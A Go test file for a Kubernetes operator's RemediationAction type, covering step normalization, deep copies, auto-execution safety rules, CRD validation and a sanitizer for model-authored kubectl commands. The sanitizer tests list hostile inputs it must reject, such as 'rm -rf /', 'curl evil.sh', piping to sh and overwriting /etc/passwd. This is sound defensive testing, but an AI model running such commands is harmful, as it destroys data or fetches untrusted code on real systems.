/*
Copyright 2026.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
*/

package v1

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
	apiextensionsv1 "k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"sigs.k8s.io/yaml"
)

func jsonPtr(t *testing.T, raw string) *apiextensionsv1.JSON {
	t.Helper()
	return &apiextensionsv1.JSON{Raw: []byte(raw)}
}

// TestEffectiveSteps covers the back-compat normalizer: explicit Steps win,
// otherwise a single step is synthesized from the legacy Action, otherwise empty.
func TestEffectiveSteps(t *testing.T) {
	t.Run("returns Steps when present", func(t *testing.T) {
		ra := &RemediationAction{
			Spec: RemediationActionSpec{
				// Action is also set to prove Steps takes precedence.
				Action: RemediationActionDetail{Type: StepTypePersonaUpdate},
				Steps: []RemediationStep{
					{Order: 1, ID: "a", Type: StepTypePersonaUpdate, AutoExecutable: true,
						Patch: jsonPtr(t, `{"spec":{"resources":{"memory":"512Mi"}}}`)},
					{Order: 2, ID: "b", Type: StepTypeRestart},
				},
			},
		}

		got := ra.EffectiveSteps()
		require.Len(t, got, 2)
		require.Equal(t, "a", got[0].ID)
		require.Equal(t, "b", got[1].ID)

		// Returned slice must be a deep copy — mutating string fields AND pointer
		// (Patch) fields on the result must not affect the source spec.
		got[0].ID = "mutated"
		got[0].Patch.Raw = []byte(`{"changed":true}`)
		require.Equal(t, "a", ra.Spec.Steps[0].ID)
		require.Equal(t, []byte(`{"spec":{"resources":{"memory":"512Mi"}}}`), ra.Spec.Steps[0].Patch.Raw)
	})

	t.Run("synthesizes auto-executable step from legacy persona-update action", func(t *testing.T) {
		ra := &RemediationAction{
			Spec: RemediationActionSpec{
				Explanation: "bump memory limit",
				Action: RemediationActionDetail{
					Type:          StepTypePersonaUpdate,
					Patch:         jsonPtr(t, `{"spec":{"resources":{"memory":"512Mi"}}}`),
					PrePatchState: jsonPtr(t, `{"spec":{"resources":{"memory":"256Mi"}}}`),
				},
			},
		}

		got := ra.EffectiveSteps()
		require.Len(t, got, 1)
		require.Equal(t, int32(1), got[0].Order)
		require.Equal(t, StepTypePersonaUpdate, got[0].Type)
		require.Equal(t, "bump memory limit", got[0].Description)
		require.True(t, got[0].AutoExecutable)
		// Patch fields are deep-copied (equal by value, independent by pointer).
		require.Equal(t, ra.Spec.Action.Patch.Raw, got[0].Patch.Raw)
		require.NotSame(t, ra.Spec.Action.Patch, got[0].Patch)
		require.Equal(t, ra.Spec.Action.PrePatchState.Raw, got[0].PrePatchState.Raw)
		require.NotSame(t, ra.Spec.Action.PrePatchState, got[0].PrePatchState)

		// Mutating the synthesized step must not corrupt the source Action.
		got[0].Patch.Raw = []byte(`{"changed":true}`)
		require.Equal(t, []byte(`{"spec":{"resources":{"memory":"512Mi"}}}`), ra.Spec.Action.Patch.Raw)
	})

	t.Run("synthesizes advisory manual step from legacy non-persona action", func(t *testing.T) {
		for _, legacyType := range []string{ActionTypeNotification, ActionTypeGitPR} {
			ra := &RemediationAction{
				Spec: RemediationActionSpec{
					Action: RemediationActionDetail{Type: legacyType},
				},
			}

			got := ra.EffectiveSteps()
			require.Len(t, got, 1)
			// notification/git-pr are advisory: mapped to the in-enum "manual" type.
			require.Equal(t, StepTypeManual, got[0].Type)
			require.False(t, got[0].AutoExecutable)
		}
	})

	t.Run("empty when neither Steps nor Action set", func(t *testing.T) {
		ra := &RemediationAction{}
		require.Empty(t, ra.EffectiveSteps())
	})

	t.Run("nil receiver is safe", func(t *testing.T) {
		var ra *RemediationAction
		require.Nil(t, ra.EffectiveSteps())
	})
}

// TestValidateAutoExecutable asserts the v1 step-safety invariant: only
// persona-update steps may be AutoExecutable.
func TestValidateAutoExecutable(t *testing.T) {
	tests := []struct {
		name    string
		steps   []RemediationStep
		wantErr bool
	}{
		{
			name:    "no steps",
			steps:   nil,
			wantErr: false,
		},
		{
			name: "persona-update auto-executable is allowed",
			steps: []RemediationStep{
				{Order: 1, ID: "a", Type: StepTypePersonaUpdate, AutoExecutable: true},
			},
			wantErr: false,
		},
		{
			name: "non-persona auto-executable is rejected",
			steps: []RemediationStep{
				{Order: 1, ID: "a", Type: StepTypePersonaUpdate, AutoExecutable: true},
				{Order: 2, ID: "b", Type: StepTypeWorkloadApply, AutoExecutable: true},
			},
			wantErr: true,
		},
		{
			name: "non-persona advisory step is allowed",
			steps: []RemediationStep{
				{Order: 1, ID: "a", Type: StepTypeScale, AutoExecutable: false},
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ra := &RemediationAction{Spec: RemediationActionSpec{Steps: tt.steps}}
			err := ra.ValidateAutoExecutable()
			if tt.wantErr {
				require.Error(t, err)
			} else {
				require.NoError(t, err)
			}
		})
	}

	t.Run("nil receiver is safe", func(t *testing.T) {
		var ra *RemediationAction
		require.NoError(t, ra.ValidateAutoExecutable())
	})

	t.Run("reports every offending step", func(t *testing.T) {
		ra := &RemediationAction{Spec: RemediationActionSpec{Steps: []RemediationStep{
			{Order: 1, ID: "ok", Type: StepTypePersonaUpdate, AutoExecutable: true},
			{Order: 2, ID: "bad-a", Type: StepTypeWorkloadApply, AutoExecutable: true},
			{Order: 3, ID: "bad-b", Type: StepTypeScale, AutoExecutable: true},
		}}}

		err := ra.ValidateAutoExecutable()
		require.Error(t, err)
		require.Contains(t, err.Error(), "bad-a")
		require.Contains(t, err.Error(), "bad-b")
	})
}

// TestRemediationStepDeepCopyRoundTrip exercises the generated deepcopy for the
// new types, asserting deep independence of the JSON pointer fields.
func TestRemediationStepDeepCopyRoundTrip(t *testing.T) {
	now := metav1.Now()
	original := &RemediationAction{
		Spec: RemediationActionSpec{
			PlanSource:  PlanSourceAIAnthropic,
			PlanSummary: "root cause: memory pressure",
			Steps: []RemediationStep{
				{
					Order:          1,
					ID:             "step-1",
					Type:           StepTypePersonaUpdate,
					Description:    "raise memory limit",
					Rationale:      "OOMKilled observed",
					Risk:           "low",
					AutoExecutable: true,
					Patch:          jsonPtr(t, `{"spec":{"resources":{"memory":"512Mi"}}}`),
					PrePatchState:  jsonPtr(t, `{"spec":{"resources":{"memory":"256Mi"}}}`),
				},
			},
		},
		Status: RemediationActionStatus{
			CurrentStep: 1,
			StepStatuses: []StepStatus{
				{Order: 1, Phase: "Applied", AppliedAt: &now, VerificationResult: "Healthy"},
			},
		},
	}

	clone := original.DeepCopy()
	require.Equal(t, original, clone)
	require.NotSame(t, original, clone)

	// Mutating the clone's deep fields must not affect the original.
	clone.Spec.Steps[0].Patch.Raw = []byte(`{"changed":true}`)
	clone.Spec.Steps[0].ID = "mutated"
	clone.Status.StepStatuses[0].Phase = "Failed"
	require.Equal(t, []byte(`{"spec":{"resources":{"memory":"512Mi"}}}`), original.Spec.Steps[0].Patch.Raw)
	require.Equal(t, "step-1", original.Spec.Steps[0].ID)
	require.Equal(t, "Applied", original.Status.StepStatuses[0].Phase)
}

// TestRemediationActionBackCompatUnmarshal asserts that a legacy single-Action
// payload (no Steps) still unmarshals unchanged and round-trips.
func TestRemediationActionBackCompatUnmarshal(t *testing.T) {
	raw := `{
		"incidentRef": {"name": "inc-1", "namespace": "default"},
		"personaRef": {"name": "app-1", "kind": "ApplicationPersona"},
		"trustLevel": 2,
		"action": {"type": "persona-update", "patch": {"spec":{"resources":{"memory":"512Mi"}}}},
		"explanation": "raise memory",
		"confidence": "0.9"
	}`

	var spec RemediationActionSpec
	require.NoError(t, json.Unmarshal([]byte(raw), &spec))
	require.Equal(t, ActionTypePersonaUpdate, spec.Action.Type)
	require.Empty(t, spec.Steps)
	require.Empty(t, spec.PlanSource)

	// New optional fields are omitted on marshal for legacy objects.
	out, err := json.Marshal(spec)
	require.NoError(t, err)
	require.NotContains(t, string(out), "steps")
	require.NotContains(t, string(out), "planSource")
	require.NotContains(t, string(out), "stepStatuses")
}

// TestRemediationStepsEnumInGeneratedCRD is a schema-marker check: it loads the
// generated CRD and asserts the kubebuilder enum markers produced the expected
// OpenAPI enum for step Type — so an out-of-enum value is rejected at apply time.
func TestRemediationStepsEnumInGeneratedCRD(t *testing.T) {
	path := filepath.Join("..", "..", "config", "crd", "bases", "dorgu.io_remediationactions.yaml")
	data, err := os.ReadFile(path)
	require.NoError(t, err, "run `make manifests` to generate the CRD")

	var crd apiextensionsv1.CustomResourceDefinition
	require.NoError(t, yaml.Unmarshal(data, &crd))
	require.NotEmpty(t, crd.Spec.Versions)

	schema := crd.Spec.Versions[0].Schema.OpenAPIV3Schema
	steps, ok := schema.Properties["spec"].Properties["steps"]
	require.True(t, ok, "spec.steps missing from CRD schema")

	stepType := steps.Items.Schema.Properties["type"]
	enum := make([]string, 0, len(stepType.Enum))
	for _, e := range stepType.Enum {
		var s string
		require.NoError(t, json.Unmarshal(e.Raw, &s))
		enum = append(enum, s)
	}

	require.ElementsMatch(t, []string{
		StepTypePersonaUpdate, StepTypeWorkloadApply, StepTypeRestart,
		StepTypeScale, StepTypeConfigChange, StepTypeManual,
	}, enum)
	require.NotContains(t, enum, "delete-namespace", "out-of-enum type must not be accepted")

	// planSource enum is also present.
	planSource := schema.Properties["spec"].Properties["planSource"]
	planEnum := make([]string, 0, len(planSource.Enum))
	for _, e := range planSource.Enum {
		var s string
		require.NoError(t, json.Unmarshal(e.Raw, &s))
		planEnum = append(planEnum, s)
	}
	require.ElementsMatch(t, []string{PlanSourceRuleBased, PlanSourceAIAnthropic}, planEnum)

	// The step-safety invariant is enforced at the API server via a CEL rule:
	// a step may be autoExecutable only when its type is persona-update.
	// The command guard is enforced the same way: a step command must be a
	// kubectl invocation, so the API server rejects anything else even if a
	// client bypasses SanitizeStepCommand.
	celRules := make([]string, 0, len(steps.Items.Schema.XValidations))
	for _, r := range steps.Items.Schema.XValidations {
		celRules = append(celRules, r.Rule)
	}
	require.NotEmpty(t, celRules, "RemediationStep must carry XValidation CEL rules")

	require.Condition(t, func() bool {
		for _, r := range celRules {
			if strings.Contains(r, "self.autoExecutable") && strings.Contains(r, StepTypePersonaUpdate) {
				return true
			}
		}
		return false
	}, "missing the autoExecutable CEL rule, got %v", celRules)

	require.Condition(t, func() bool {
		for _, r := range celRules {
			if strings.Contains(r, "self.command") && strings.Contains(r, "kubectl ") {
				return true
			}
		}
		return false
	}, "missing the command CEL rule, got %v", celRules)

	command := steps.Items.Schema.Properties["command"]
	require.Equal(t, "string", command.Type, "spec.steps[].command missing from CRD schema")
	require.NotNil(t, command.MaxLength)
	require.Equal(t, int64(MaxStepCommandLength), *command.MaxLength)
	require.NotContains(t, steps.Items.Schema.Required, "command", "command must stay optional")
}

// TestSanitizeStepCommand covers the display guard for model-authored step
// commands: only single-line kubectl invocations without shell metacharacters
// survive, everything else is dropped rather than repaired.
func TestSanitizeStepCommand(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "keeps a plain kubectl command",
			in:   "kubectl set image deployment/web web=nginx:1.27-alpine -n demo",
			want: "kubectl set image deployment/web web=nginx:1.27-alpine -n demo",
		},
		{
			name: "trims surrounding whitespace",
			in:   "  kubectl rollout restart deployment/web -n demo  ",
			want: "kubectl rollout restart deployment/web -n demo",
		},
		{
			name: "keeps a quoted JSON patch",
			in:   `kubectl patch deployment web -n demo --type merge -p '{"spec":{"replicas":3}}'`,
			want: `kubectl patch deployment web -n demo --type merge -p '{"spec":{"replicas":3}}'`,
		},
		{name: "drops empty", in: "", want: ""},
		{name: "drops whitespace only", in: "   ", want: ""},
		{name: "drops a non-kubectl binary", in: "helm uninstall dorgu-operator", want: ""},
		{name: "drops bare kubectl with no arguments", in: "kubectl", want: ""},
		{name: "drops a kubectl-prefixed impostor", in: "kubectlfoo get pods", want: ""},
		{name: "drops command chaining", in: "kubectl get pods; rm -rf /", want: ""},
		{name: "drops backgrounded chaining", in: "kubectl get pods && curl evil.sh", want: ""},
		{name: "drops pipes", in: "kubectl get pods | sh", want: ""},
		{name: "drops redirection", in: "kubectl get pods > /etc/passwd", want: ""},
		{name: "drops command substitution", in: "kubectl delete ns $(cat /tmp/ns)", want: ""},
		{name: "drops backticks", in: "kubectl delete ns `cat /tmp/ns`", want: ""},
		{name: "drops variable expansion", in: "kubectl apply -f $HOME/evil.yaml", want: ""},
		{name: "drops a second line", in: "kubectl get pods\nrm -rf /", want: ""},
		{name: "drops a carriage return", in: "kubectl get pods\rrm -rf /", want: ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			require.Equal(t, tt.want, SanitizeStepCommand(tt.in))
		})
	}

	t.Run("drops a command over the length bound", func(t *testing.T) {
		long := "kubectl annotate deployment web " + strings.Repeat("a", MaxStepCommandLength)
		require.Equal(t, "", SanitizeStepCommand(long))
	})

	t.Run("keeps a command at the length bound", func(t *testing.T) {
		prefix := "kubectl annotate deployment web note="
		at := prefix + strings.Repeat("a", MaxStepCommandLength-len(prefix))
		require.Len(t, at, MaxStepCommandLength)
		require.Equal(t, at, SanitizeStepCommand(at))
	})
}
